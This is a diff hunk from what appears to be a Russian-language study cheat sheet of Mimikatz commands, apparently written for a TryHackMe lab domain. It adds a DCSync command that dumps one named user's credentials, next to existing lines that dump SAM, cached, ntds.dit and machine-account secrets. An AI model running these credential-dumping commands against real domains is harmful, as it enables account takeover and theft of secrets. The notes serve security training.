@@ -31,6 +31,7 @@ lsadump::sam /system:C:\Share-Server\files\SYSTEM /sam:C:\Share-Server\files\SAM
 - `token::whoami` - выводит информацию о текущем пользователе.
 - `lsadump::cache` - mscash2 последних 10 пользователей из систем и секьюрити
 - `lsadump::dcsync` - /all /csv - дампим ntds.dit с контроллера
+- `lsadump::dcsync /domain:za.tryhackme.loc /user:lorraine.gill` - дампим определенного пользака
 Подробнее: https://www.securitylab.ru/analytics/517178.php
 
 - `lsadump::secrets`  - ntlm аккаунта машины
